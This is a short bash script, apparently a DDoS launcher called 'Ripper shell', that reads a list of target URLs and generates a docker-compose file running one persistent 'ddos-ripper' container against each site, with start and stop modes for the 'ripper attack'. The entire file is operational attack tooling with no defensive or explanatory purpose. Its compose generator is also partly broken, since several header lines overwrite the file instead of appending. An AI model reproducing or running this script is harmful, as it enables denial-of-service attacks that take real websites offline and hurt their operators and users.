#!/bin/bash
# Ripper shell v1.0

FILE="resources.txt"
MODE="reinstall"

function print_help {
  echo -e "Usage: ddos.sh"
  echo -e "--file|-f - filename where urls are located"
}

function check_params {
  if [ -z ${FILE+x} ]; then
    echo -e "Filename is unset, please specify filename for urls file"
    exit 1
  fi
}

function generate_compose {
    echo -e "version: '3'" > docker-compose.yml
    echo -e "networks:" > docker-compose.yml
    echo -e "  default:" > docker-compose.yml
    echo -e "    driver: bridge" > docker-compose.yml
    echo -e "    ipam:" > docker-compose.yml
    echo -e "      config:" > docker-compose.yml
    echo -e "        - subnet: 10.10.1.0/24" > docker-compose.yml
    echo -e "services:" >> docker-compose.yml
    counter=1
    while read -r site_url; do
        if [ ! -z $site_url ]; then
            echo -e "  ddos-runner-$counter:" >> docker-compose.yml
            echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
            echo -e "    restart: always" >> docker-compose.yml
            echo -e "    command: $site_url" >> docker-compose.yml
            ((counter++))
        fi
    done < $FILE
}

function ripper_start {
  echo "Starting ripper attack"
  docker-compose up -d
}

function ripper_stop {
  echo "Stopping ripper attack"
  docker-compose down
}

while test -n "$1"; do
  case "$1" in
  --help|-h)
    print_help
    exit
    ;;
  --file|-f)
    FILE=$2
    shift
    ;;
  --mode|-m)
    MODE=$2
    shift
    ;;
  *)
    echo "Unknown argument: $1"
    print_help
    exit
    ;;
  esac
  shift
done

check_params

case $MODE in
  install)
    generate_compose
    ripper_start
    ;;
  start)
    ripper_start
    ;;
  stop)
    ripper_stop
    ;;
  reinstall)
    ripper_stop
    generate_compose
    ripper_start
    ;;
  *)
    echo "Wrong mode"
    exit 1
esac
